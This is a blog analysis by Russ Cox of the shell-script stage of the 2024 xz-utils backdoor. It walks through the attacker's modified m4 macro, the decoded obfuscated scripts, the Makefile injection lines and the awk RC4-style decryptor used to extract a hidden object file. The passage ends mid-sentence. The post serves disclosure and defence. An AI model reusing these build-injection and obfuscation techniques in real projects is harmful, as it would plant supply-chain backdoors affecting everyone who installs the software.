---
title: "The xz attack shell script"
url: "https://research.swtch.com/xz-script"
fetched_at: 2026-05-05T07:01:01.038688+00:00
source: "Russ Cox (research.swtch)"
tags: [blog, raw]
---

# The xz attack shell script

Source: https://research.swtch.com/xz-script

The xz attack shell script
Russ Cox
April 2, 2024
Updated April 3, 2024.
research.swtch.com/xz-script
Posted on Tuesday, April 2, 2024.
Updated Wednesday, April 3, 2024.
Introduction
Andres Freund
published the existence of the xz attack
on 2024-03-29 to the public oss-security@openwall mailing list. The day before, he alerted Debian security and the (private) distros@openwall list. In his mail, he says that he dug into this after “observing a few odd symptoms around liblzma (part of the xz package) on Debian sid installations over the last weeks (logins with ssh taking a lot of CPU, valgrind errors).”
At a high level, the attack is split in two pieces: a shell script and an object file. There is an injection of shell code during
configure
, which injects the shell code into
make
. The shell code during
make
adds the object file to the build. This post examines the shell script. (See also
my timeline post
.)
The nefarious object file would have looked suspicious checked into the repository as
evil.o
, so instead both the nefarious shell code and object file are embedded, compressed and encrypted, in some binary files that were added as “test inputs” for some new tests. The test file directory already existed from long before Jia Tan arrived, and the README explained “This directory contains bunch of files to test handling of .xz, .lzma (LZMA_Alone), and .lz (lzip) files in decoder implementations. Many of the files have been created by hand with a hex editor, thus there is no better “source code” than the files themselves.” This is a fact of life for parsing libraries like liblzma. The attacker looked like they were just
adding a few new test files
.
Unfortunately the nefarious object file turned out to have a bug that caused problems with Valgrind, so the test files needed to be updated to add the fix.
That commit
explained “The original files were generated with random local to my machine. To better reproduce these files in the future, a constant seed was used to recreate these files.” The attackers realized at this point that they needed a better update mechanism, so the new nefarious script contains an extension mechanism that lets it look for updated scripts in new test files, which wouldn’t draw as much attention as rewriting existing ones.
The effect of the scripts is to arrange for the nefarious object file’s
_get_cpuid
function to be called as part of a
GNU indirect function
(ifunc) resolver. In general these resolvers can be called lazily at any time during program execution, but for security reasons it has become popular to call all of them during dynamic linking (very early in program startup) and then map the
global offset table (GOT) and procedure linkage table (PLT) read-only
, to keep buffer overflows and the like from being able to edit it. But a nefarious ifunc resolver would run early enough to be able to edit those tables, and that’s exactly what the backdoor introduced. The resolver then looked through the tables for
RSA_public_decrypt
and replaced it with a nefarious version that
runs attacker code when the right SSH certificate is presented
.
Configure
Again, this post looks at the script side of the attack. Like most complex Unix software, xz-utils uses GNU autoconf to decide how to build itself on a particular system. In ordinary operation, autoconf reads a
configure.ac
file and produces a
configure
script, perhaps with supporting m4 files brought in to provide “libraries” to the script. Usually, the
configure
script and its support libraries are only added to the tarball distributions, not the source repository. The xz distribution works this way too.
The attack kicks off with the attacker adding an unexpected support library,
m4/build-to-host.m4
to the xz-5.6.0 and xz-5.6.1 tarball distributions. Compared to the standard
build-to-host.m4
, the attacker has made the following changes:
diff --git a/build-to-host.m4 b/build-to-host.m4
index ad22a0a..d5ec315 100644
--- a/build-to-host.m4
+++ b/build-to-host.m4
@@ -1,5 +1,5 @@
-# build-to-host.m4 serial 3
-dnl Copyright (C) 2023 Free Software Foundation, Inc.
+# build-to-host.m4 serial 30
+dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.
 dnl This file is free software; the Free Software Foundation
 dnl gives unlimited permission to copy and/or distribute it,
 dnl with or without modifications, as long as this notice is preserved.
@@ -37,6 +37,7 @@ AC_DEFUN([gl_BUILD_TO_HOST],


   dnl Define somedir_c.
   gl_final_[$1]="$[$1]"
+  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
   dnl Translate it from build syntax to host syntax.
   case "$build_os" in
     cygwin*)
@@ -58,14 +59,40 @@ AC_DEFUN([gl_BUILD_TO_HOST],
   if test "$[$1]_c_make" = '\"'"${gl_final_[$1]}"'\"'; then
     [$1]_c_make='\"$([$1])\"'
   fi
+  if test "x$gl_am_configmake" != "x"; then
+    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
+  else
+    gl_[$1]_config=''
+  fi
+  _LT_TAGDECL([], [gl_path_map], [2])dnl
+  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl
+  _LT_TAGDECL([], [gl_am_configmake], [2])dnl
+  _LT_TAGDECL([], [[$1]_c_make], [2])dnl
+  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl
   AC_SUBST([$1_c_make])
+
+  dnl If the host conversion code has been placed in $gl_config_gt,
+  dnl instead of duplicating it all over again into config.status,
+  dnl then we will have config.status run $gl_config_gt later, so it
+  dnl needs to know what name is stored there:
+  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
 ])


 dnl Some initializations for gl_BUILD_TO_HOST.
 AC_DEFUN([gl_BUILD_TO_HOST_INIT],
 [
+  dnl Search for Automake-defined pkg* macros, in the order
+  dnl listed in the Automake 1.10a+ documentation.
+  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
+  if test -n "$gl_am_configmake"; then
+    HAVE_PKG_CONFIGMAKE=1
+  else
+    HAVE_PKG_CONFIGMAKE=0
+  fi
+
   gl_sed_double_backslashes='s/\\/\\\\/g'
   gl_sed_escape_doublequotes='s/"/\\"/g'
+  gl_path_map='tr "\t \-_" " \t_\-"'
 changequote(,)dnl
   gl_sed_escape_for_make_1="s,\\([ \"&'();<>\\\\\`|]\\),\\\\\\1,g"
 changequote([,])dnl
All in all, this is a fairly plausible set of diffs, in case anyone thought to check. It bumps the version number, updates the copyright year to look current, and makes a handful of inscrutable changes that don’t look terribly out of place.
Looking closer, something is amiss. Starting near the bottom,
gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
if test -n "$gl_am_configmake"; then
  HAVE_PKG_CONFIGMAKE=1
else
  HAVE_PKG_CONFIGMAKE=0
fi
Let’s see which files in the distribution match the pattern (simplifying the
grep
command):
% egrep -Rn '####[[:alnum:]][[:alnum:]][[:alnum:]][[:alnum:]][[:alnum:]]####$'
Binary file ./tests/files/bad-3-corrupt_lzma2.xz matches
%
That’s surprising! So this script sets
gl_am_configmake=./tests/files/bad-3-corrupt_lzma2.xz
and
HAVE_PKG_CONFIGMAKE=1
. The
gl_path_map
setting is a
tr(1)
command that swaps tabs and spaces and swaps underscores and dashes.
Now reading the top of the script,
gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
extracts the final dot-separated element of that filename, leaving
xz
. That is, it’s the file name suffix, not a prefix, and it is the name of the compression command that is likely already installed on any build machine.
The next section is:
if test "x$gl_am_configmake" != "x"; then
  gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
else
  gl_[$1]_config=''
fi
We know that
gl_am_configmake=./tests/files/bad-3-corrupt_lzma2.xz
, so this sets the
gl_[$1]_config
variable to the string
sed "r\n" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null
At first glance, especially in the original quoted form, the
sed
command looks like it has something to do with line endings, but in fact
r\n
is the
sed
“read from file
\n
” command. Since the file
\n
does not exist, the command does nothing at all, and then since
sed
has not been invoked with the
-n
option,
sed
prints each line of input. So
sed "r\n"
is just an obfuscated
cat
command, and remember that
$gl_path_map
is the
tr
command from before, and
$gl_[$1]_prefix
is
xz
. To the shell, this command is really
cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d
But right now it’s still just a string; it hasn’t been run. That changes with
dnl If the host conversion code has been placed in $gl_config_gt,
dnl instead of duplicating it all over again into config.status,
dnl then we will have config.status run $gl_config_gt later, so it
dnl needs to know what name is stored there:
AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
The final
"eval \$gl_[$1]_config"
runs that command. If we run it on the xz 5.6.0 repo, we get:
$ cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d
####Hello####
#��Z�.hj�
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +724)";
(xz -dc $srcdir/tests/files/good-large_compressed.lzma|
    eval $i|tail -c +31265|
    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|
    xz -F raw --lzma1 -dc|/bin/sh
####World####
$
I have inserted some line breaks, here and in later script fragments,
to keep the lines from being too long in the web page.
Why the Hello and World? The README text that came with the test file describes it:
bad-3-corrupt_lzma2.xz has three Streams in it. The first and third streams are valid xz Streams. The middle Stream has a correct Stream Header, Block Header, Index and Stream Footer. Only the LZMA2 data is corrupt. This file should decompress if
--single-stream
is used.
The first and third streams are the Hello and World, and the middle stream has been corrupted by swapping the byte values unswapped by the
tr
command.
Recalling that xz 5.6.1 shipped with different “test” files, we can also try xz 5.6.1:
$ cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d
####Hello####
#�U��$�
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +939)";
(xz -dc $srcdir/tests/files/good-large_compressed.lzma|
    eval $i|tail -c +31233|
    tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")|
    xz -F raw --lzma1 -dc|/bin/sh
####World####
$
The first difference is that the script makes sure (very sure!) to exit if not being run on Linux. The second difference is that the long “
export i
” line deviates in the final head command offset (724 vs 939) and then the tail offset and the
tr
argument. Let’s break those down.
The
head
command prints a prefix of its input. Let’s look at the start:
(head -c +1024 >/dev/null) && head -c +2048 &&
(head -c +1024 >/dev/null) && head -c +2048 && ...
This discards the first kilobyte of standard input, prints the next two kilobytes, discards the next kilobyte, and prints the next two kilobytes. And so on. The whole command for 5.6.1 is:
(head -c +1024 >/dev/null) && head -c +2048 &&
(head -c +1024 >/dev/null) && head -c +2048 &&
... 16 times total ...
head -c +939
The shell variable
i
is set to this long command. Then the script runs:
xz -dc $srcdir/tests/files/good-large_compressed.lzma |
eval $i |
tail -c +31233 |
tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377" |
xz -F raw --lzma1 -dc |
/bin/sh
The first
xz
command uncompresses another malicious test file. The
eval
then runs the
head
pipeline, extracting a total of 16×2048+939 = 33,707 bytes. Then the
tail
command keeps only the final 31,233 bytes. The
tr
command applies a simple substitution cipher to the output (so that just in case anyone thought to pull these specific byte ranges out of the file, they wouldn’t recognize it as a valid lzma input!?). The second
xz
command decodes the translated bytes as a raw lzma stream, and then of course the result is piped through the shell.
Skipping the shell pipe, we can run this, obtaining a very long shell script. I have added commentary in between sections of the output.
$ xz -dc $srcdir/tests/files/good-large_compressed.lzma |
  eval $i |
  tail -c +31233 |
  tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
  xz -F raw --lzma1 -dc
P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
C="pic_flag=\" $P\""
O="^pic_flag=\" -fPIC -DPIC\"$"
R="is_arch_extension_supported"
x="__get_cpuid("
p="good-large_compressed.lzma"
U="bad-3-corrupt_lzma2.xz"
So far, setting up environment variables.
[ ! $(uname)="Linux" ] && exit 0  # 5.6.1 only
A line that only appears in 5.6.1, exiting when not run on Linux. In general the scripts in 5.6.0 and 5.6.1 are very similar: 5.6.1 has a few additions. We will examine the 5.6.1 script, with the additions marked. This line is an attempted robustness fix with a bug (pointed out by Jakub Wilk): there are no spaces around the
=
, making the line a no-op.
eval $zrKcVq
The first of many odd eval statements, for variables that do not appear to be set anywhere. One possibility is that these are debug prints: when the attacker is debugging the script, setting, say,
zrKcVq=env
inserts a debug print during execution. Another possibility is that these are extension points that can be set by some other mechanism, run before this code, in the future.
if test -f config.status; then
eval $zrKcSS
eval `grep ^LD=\'\/ config.status`
eval `grep ^CC=\' config.status`
eval `grep ^GCC=\' config.status`
eval `grep ^srcdir=\' config.status`
eval `grep ^build=\'x86_64 config.status`
eval `grep ^enable_shared=\'yes\' config.status`
eval `grep ^enable_static=\' config.status`
eval `grep ^gl_path_map=\' config.status`
If
config.status
exists, we read various variables from it into the shell, along with two extension points. Note that we are still inside the config.status check (let’s call it “if #1”) as we continue through the output.
# Entirely new in 5.6.1
vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2>/dev/null`
if test "x$vs" != "x" > /dev/null 2>&1;then
f1=`echo $vs | cut -d: -f1`
if test "x$f1" != "x" > /dev/null 2>&1;then
start=`expr $(echo $vs | cut -d: -f2) + 7`
ve=`grep -broaF '|_!{ -' $srcdir/tests/files/ 2>/dev/null`
if test "x$ve" != "x" > /dev/null 2>&1;then
f2=`echo $ve | cut -d: -f1`
if test "x$f2" != "x" > /dev/null 2>&1;then
[ ! "x$f2" = "x$f1" ] && exit 0
[ ! -f $f1 ] && exit 0
end=`expr $(echo $ve | cut -d: -f2) - $start`
eval `cat $f1 | tail -c +${start} | head -c +${end} |
    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
    xz -F raw --lzma2 -dc`
fi
fi
fi
fi
This section is entirely new in 5.6.1. It looks for a single test file to contain the magic texts
'~!:_ W'
and
'|_!{ -'
, extracts the bytes between them, applies a substitution cipher, decompresses the result, and evaluates the output as a shell script. This appears to be an extension mechanism, so that the next time changes are needed in this script, a new script can be added in a different test file, instead of having to
make up reasons to regenerate existing binary test files
.
The next chunk continues with script that was present in 5.6.0.
eval $zrKccj
if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status > /dev/null 2>&1;then
exit 0
fi
if ! grep -qs 'define HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h > /dev/null 2>&1;then
exit 0
fi
Two different checks that
GNU indirect function
support is enabled. If not, stop the script. The backdoor requires this functionality.
if test "x$enable_shared" != "xyes";then
exit 0
fi
Require shared library support.
if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
exit 0
fi
Require an x86-64 Linux system.
if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc64_fast.c > /dev/null 2>&1; then
exit 0
fi
if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc32_fast.c > /dev/null 2>&1; then
exit 0
fi
if ! grep -qs "$R" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
exit 0
fi
if ! grep -qs "$x" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
exit 0
fi
Require all the crc ifunc code (in case it has been patched out?).
if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
exit 0
fi
if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
exit 0
fi
LDv=$LD" -v"
if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
exit 0
fi
Require gcc (not clang, I suppose) and GNU ld.
if ! test -f "$srcdir/tests/files/$p" > /dev/null 2>&1;then
exit 0
fi
if ! test -f "$srcdir/tests/files/$U" > /dev/null 2>&1;then
exit 0
fi
Require the backdoor-containing test files. Of course, if these files didn’t exist, it’s unclear how we obtained this script in the first place, but better safe than sorry, I suppose.
if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
eval $zrKcst
Add a bunch of checks when the file
debian/rules
exists or
$RPM_ARCH
is set to
x86_64
. Note that we are now inside two
if
statements: the
config.status
check above, and this one (let’s call it “if #2”).
j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
if ! grep -qs "$j" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
z="^am__uninstall_files_from_dir = {"
if ! grep -qs "$z" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
w="^am__install_max ="
if ! grep -qs "$w" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
E=$z
if ! grep -qs "$E" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
Q="^am__vpath_adj_setup ="
if ! grep -qs "$Q" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
M="^am__include = include"
if ! grep -qs "$M" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
L="^all: all-recursive$"
if ! grep -qs "$L" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
if ! grep -qs "$m" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
if ! grep -qs "$u" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
Check that
liblzma/Makefile
contains all the lines that will be used as anchor points later for inserting new text into the Makefile.
if ! grep -qs "$O" libtool > /dev/null 2>&1;then
exit 0
fi
$O
was set at the very start of the script. This is checking that the libtool file, presumably generated during the build process, configures the compiler for a PIC (position independent code) build.
eval $zrKcTy
b="am__test = $U"
$U
was also set at the start of the script:
U="bad-3-corrupt_lzma2.xz"
. Real work is starting!
sed -i "/$j/i$b" src/liblzma/Makefile || true
sed -i
runs an in-place modification of the input file, in this case
liblzma/Makefile
. Specifically, find the
ACLOCAL_M4
line we grepped for earlier (
/$j/
) and insert the
am__test
setting from
$b
(
i$b
).
d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
b="am__strip_prefix = $d"
sed -i "/$w/i$b" src/liblzma/Makefile || true
Shell quoting inside a quoted string inside a Makefile really is something special. This is escaping the backslashes in the tr command enough times that it will work to insert them into the Makefile after the
am__install_max
line (
$w
).
b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
sed -i "/$E/i$b" src/liblzma/Makefile || true
b="\$(top_srcdir)/tests/files/\$(am__test)"
s="am__test_dir=$b"
sed -i "/$Q/i$s" src/liblzma/Makefile || true
More added lines. It’s worth stopping for a moment to look at what’s happened so far. The script has added these lines to
src/liblzma/Makefile
:
am__test = bad-3-corrupt_lzma2.xz
am__strip_prefix = tr "\\t \\-_" " \\t_\\-"
am__dist_setup = $(am_strip_prefix) | xz -d 2>/dev/null | $(SHELL)
am__test_dir = $(top_srcdir)/tests/files/$(am__test)
These look plausible but fall apart under closer examination: for example,
am__test_dir
is a file, not a directory. The goal here seems to be that after
configure
has run, the generated
Makefile
still looks plausibly inscrutable. And the lines have been added in scattered places throughout the
Makefile
; no one will see them all next to each other like in this display. Back to the script:
h="-Wl,--sort-section=name,-X"
if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
h=$h",-z,now"
fi
j="liblzma_la_LDFLAGS += $h"
sed -i "/$L/i$j" src/liblzma/Makefile || true
Add
liblzma_la_LDFLAGS += -Wl,--sort-section=name,-X
to the Makefile. If the
LDFLAGS
do not already say
-z,now
or
-Wl,now
, add
-z,now
.
The “
-Wl,now
” forces
LD_BIND_NOW
behavior, in which the dynamic loader resolves all symbols at program startup time. One reason this is normally done is for security: it makes sure that the global offset table and procedure linkage tables can be marked read-only early in process startup, so that buffer overflows or write-after-free bugs cannot target those tables. However, it also has the effect of running GNU indirect function (ifunc) resolvers at startup during that resolution process, and the backdoor arranges to be called from one of those. This early invocation of the backdoor setup lets it run while the tables are still writable, allowing the backdoor to replace the entry for
RSA_public_decrypt
with its own version. But we are getting ahead of ourselves. Back to the script:
sed -i "s/$O/$C/g" libtool || true
We checked earlier that the libtool file said
pic_flag=" -fPIC -DPIC"
. The sed command changes it to read
pic_flag=" -fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
.
It is not clear why these additional flags are important, but in general they disable linker optimizations that could plausibly get in the way of subterfuge.
k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
sed -i "s/$u/$k/" src/liblzma/Makefile || true
l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
    export top_srcdir='\$(top_srcdir)'; \\\\\n\
    export CC='\$(CC)'; \\\\\n\
    export DEFS='\$(DEFS)'; \\\\\n\
    export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
    export INCLUDES='\$(INCLUDES)'; \\\\\n\
    export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
    export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
    export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
    export CFLAGS='\$(CFLAGS)'; \\\\\n\
    export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
    export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
    export libdir='\$(libdir)'; \\\\\n\
    export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
    export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";
sed -i "/$m/i$l" src/liblzma/Makefile || true
eval $zrKcHD
Shell quoting continues to be trippy, but we’ve reached the final change. This adds the line
AM_V_CCLD = @echo -n $(LTDEPS); $(am__v_CCLD_$(V))
to one place in the Makefile, and then adds a long script that sets up some variables, entirely as misdirection, that ends with
sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1
The
sed rpath
command is just as much an obfuscated
cat
as
sed "r\n"
was, but
-rpath
is a very common linker flag, so at first glance you might not notice it’s next to the wrong command. Recalling the
am__test
and related lines added above, this pipeline ends up being equivalent to:
cat ./tests/files/bad-3-corrupt_lzma2.xz |
tr "\t \-_" " \t_\-" |
xz -d |
/bin/sh
Our old friend! We know what this does, though. It runs the very script we are currently reading in this post.
How recursive!
Make
Instead of running during
configure
in the tarball root directory, let’s mentally re-execute the script as it would run during
make
in the
liblzma
directory. In that context, the variables at the top have been set, but all the editing we just considered was skipped over by “if #1” not finding
./config.status
. Now let’s keep executing the script.
fi
That
fi
closes “if #2”, which checked for a Debian or RPM build. The upcoming
elif
continues “if #1”, which checked for config.status, meaning now we are executing the part of the script that matters when run during
make
in the
liblzma
directory:
elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then
If we see the built objects for the crc code, we are running as part of
make
. Run the following code.
# Entirely new in 5.6.1
vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null`
if test "x$vs" != "x" > /dev/null 2>&1;then
f1=`echo $vs | cut -d: -f1`
if test "x$f1" != "x" > /dev/null 2>&1;then
start=`expr $(echo $vs | cut -d: -f2) + 7`
ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null`
if test "x$ve" != "x" > /dev/null 2>&1;then
f2=`echo $ve | cut -d: -f1`
if test "x$f2" != "x" > /dev/null 2>&1;then
[ ! "x$f2" = "x$f1" ] && exit 0
[ ! -f $f1 ] && exit 0
end=`expr $(echo $ve | cut -d: -f2) - $start`
eval `cat $f1 | tail -c +${start} | head -c +${end} |
    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
    xz -F raw --lzma2 -dc`
fi
fi
fi
fi
We start this section with another extension hook. This time the magic strings are
'jV!.^%'
and
'%.R.1Z'
. As before, there are no test files with these strings. This was for future extensibility.
On to the code shared with 5.6.0:
eval $zrKcKQ
if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
exit 0
fi
if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
exit 0
fi
if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
exit 0
fi
if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
exit 0
fi
Check that the ifunc-enabled CRC source files look right. Interestingly, Lasse Collin renamed
crc_clmul.c
to
crc_x86_clmul.h
on 2024-01-11
. One has to assume that the person or team behind “Jia Tan” had been working on all this code well before then and that the first version checked
crc_clmul.c
. They were probably very annoyed when Lasse Collin accidentally broke their in-development backdoor by cleaning up the file names!
if ! grep -qs "$C" ../../libtool; then
exit 0
fi
if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
exit 0
fi
Check that the build configuration has the extra flags we added before.
if echo $liblzma_la_LINK | grep -qs -e "lazy" > /dev/null 2>&1;then
exit 0
fi
Check that no one has added
lazy
to the linker options, which might override the
-Wl,now
. (This code really needs to run before the tables it patches get marked read-only!)
N=0
W=0
Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`
eval $zrKcjv
if test -z "$Y"; then
N=0
W=88664
else
N=88664
W=0
fi
This is selecting between two different offset values depending on the content of
gettext.m4
. The distributed xz tarballs do not contain that string in
gettext.m4
(it does appear in
build-to-host.m4
), so the
grep
finds nothing,
$Y
is the empty string, and the true case of the
if
executes:
N=0
and
W=88792
.
xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" |
I inserted a line break here. Remember the “corrupt” test file script set
i
to the large head pipeline? It’s still set here, being used inside the script extracted from that pipeline. Before, the pipeline extracted 33,707 bytes and then we used the final 31,233 bytes. Now we are using the entire thing, which probably means just the prefix that we skipped before. The sed command is inserting a newline after every byte of that output, setting up for piping into the remainder of the command line:
LC_ALL=C awk '
BEGIN{
    FS="\n";RS="\n";ORS="";m=256;
    for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}
    i=0;j=0;for(l=0;l<8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}
}
{
    v=t["x" (NF<1?RS:$1)];
    i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];
    printf "%c",(v+k)%m
}' |
I inserted another line break here. What is this?
@nugxperience on Twitter recognized it
as an RC4-like decryption function, implemented in awk! Apparently the
tr
-based substitution cipher wasn’t secure enough for this step. This is the 5.6.1 version; the 5.6.0 version is the same except that the second loop counts to 4096 instead of 8192.
Back to the script:
xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
We finally made it to the end of this long line. The decrypted output is piped through xz to decompress it; the
--single-stream
flag says to stop at the end of the first xz EOF marker instead of looking for additional files on standard input. This avoids reading the section of the input that we extracted with the
tail
command before. Then the decompressed data is piped through a
head
pair that extracts either the full 88,792 byte input or zero bytes, depending on
gettext.m4
from before, and writes it to
liblzma_la-crc64-fast.o
. In our build, we are taking the full input.
if ! test -f liblzma_la-crc64-fast.o; then
exit 0
fi
If all that failed, stop quietly.
cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true
Wait what? Oh! Notice the two different file names
crc64_fast
versus
crc64-fast
. And neither of these is the one we just extracted. These are in
.libs/
, and the one we extracted is in the current directory. This is backing up the real file (the underscored one) into a file with a very similar name (the hyphenated one).
V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) &&
    defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) &&
    (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\n
    extern int _get_cpuid(int, void*, void*, void*, void*, void*);\n
    static inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4];
    success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16);
    const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19);
    return success && (r[2] & ecx_mask) == ecx_mask; }\n
    #else\n
    #define _is_arch_extension_supported is_arch_extension_supported'
This string
$V
begins with “
#endif
